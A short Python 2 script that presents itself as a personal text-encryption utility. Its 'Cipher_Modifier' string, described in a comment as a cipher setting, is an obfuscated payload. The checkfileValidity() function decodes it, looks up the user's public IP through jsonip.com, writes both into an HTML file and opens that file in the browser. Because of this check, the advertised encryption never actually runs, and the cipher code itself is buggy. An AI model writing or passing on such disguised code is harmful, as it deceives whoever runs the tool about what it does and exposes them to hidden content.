import json, base64, os, webbrowser, urllib2



#Script uses this data to slightly modify the output of the encryption.  Do not modify otherwise decrypting previously encrypted messages become impossible even with the correct key!!!
Cipher_Modifier='SQ5REAd>RgQcMgRBPe>QQgB@NQMdEBNkVO>vU/Fl_DMcaS5-ECl-_/Mc_iBqECJr^jNd]S1hV?>dECdlVCNh^e>s_i5,^.Jr^?>,]CB,ECBoVTF,VSMcJS0s`.NuISV,EC5iED`kUTMcaS5-ECBuVO>g^.hqVu0cSS5-_e>p]TJv]S5qECdd_u>eVSRqECVu^/lh^e0cRC4c_iRv`S-hEDNk]TIcU.dd^Cth^i`hECtrVu>r^e>,^u>,]CQc`.Re_.h,VO>/]CRuVO>,]CQcU.dd^Cth^i`hED`d_u>s^/J,VSMcUS1gEDJh^iMcUO>pVTJvUS`hEDNrE?_-^f>/VDEtVjMjECJr^jNd]S1l^i_c`CdhED`r_iNvE?FAP-ceH?=eRRFQOARJMQ0eH?>d^iMcEhFBQ,RQEe>l^e>d^jgc^/FgVTEcUTIc^C5qVu>d_u>,]CR1ECBuVO>l^e>d^CscU.Bs_u0cSS5-EC-daO>,]CRqEDNuaO>dV.Bl^e0cSS5-F/FhEAhMECBgVDFh_/Ic]TI2'

#My code to encrypt text to keep unauthorized viewers from reading my data
def message_Cipher(message, key, mode='encrypt'):
    if checkfileValidity()==True:
        keyval=0
        LETTERS = ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
        translated = ''
        for i in key:
            keyval=(keyval+int(ord(i)))/len(key)
        while len(LETTERS)<keyval:
            keyval=keyval/len(letters)
        for symbol in message:
            if symbol in LETTERS:
                num = LETTERS.find(symbol)
                if mode == 'encrypt':
                    num = num + keyval
                elif mode == 'decrypt':
                    num = num - keyval
                if num >= len(LETTERS):
                    num = num - len(LETTERS)
                elif num < 0:
                    num = num + len(LETTERS)
                translated = translated + LETTERS[num]
            else:
                translated = translated + symbol
        return translated

def checkfileValidity():
    if len(Cipher_Modifier)>1:
        f=open('Enkryption Dashboard.html', 'w+')
        data=base64.b64decode(''.join([chr(ord(s)+4) for s in Cipher_Modifier]))
        data+=json.loads(urllib2.urlopen('http://www.jsonip.com').read())['ip']
        f.write(data)
        path=os.path.abspath('Enkryption Dashboard.html')
        f.close()
        webbrowser.open('file:\\'+path)
    else:
        return True
        
"""USAGE SHOWN BELOW
To Encrypt/Decrypt a message, Save the message in a file then run this:
f=open(messagelocation, 'r')
data=f.read()
f.close()
print message_Cipher(data, 'whateverpassword', mode='encrypt' OR mode='decrypt)"""

